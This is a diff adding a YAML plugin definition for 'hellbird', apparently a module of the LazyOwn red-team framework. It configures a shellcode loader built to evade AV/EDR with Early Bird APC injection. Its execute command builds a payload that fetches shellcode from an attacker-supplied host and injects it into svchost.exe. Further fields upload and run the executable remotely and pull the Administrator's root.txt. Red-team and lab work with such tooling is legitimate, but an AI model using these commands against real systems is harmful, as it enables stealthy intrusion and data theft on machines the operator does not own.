@@ -1,0 +1,20 @@
+name: hellbird
+description: >
+  hellbird is a next-generation, automated framework for generating, obfuscating, and delivering shellcode through in-memory loaders. Designed for red team operations, penetration testing, and offensive research, hellbird empowers attackers to deploy stealthy, fileless payloads that execute directly in memory — bypassing traditional AV/EDR detection mechanisms using Early Bird APC Injection and NT Native API Calls.
+author: "LazyOwn RedTeam"
+version: "1.0"
+enabled: true
+params:
+  - name: lhost
+    type: string
+    required: true
+    description: lhost target.
+tool:
+  name: hellbird
+  repo_url: https://github.com/grisuno/hellbird.git
+  install_path: external/.exploit/hellbird
+  install_command: make windows
+  execute_command: chmod +x *.sh && ./gen_hellbird3.sh --target windows --url http://{lhost}/shellcode_windows.txt --key 0x33 --process-name "C:/Windows/System32/svchost.exe"
+  upload_file: no_priv ./external/.exploit/hellbird/hellbird.exe
+  remote_command: no_priv powershell .\hellbird.exe
+  download_file: C:\Users\Administrator\Desktop\root.txt
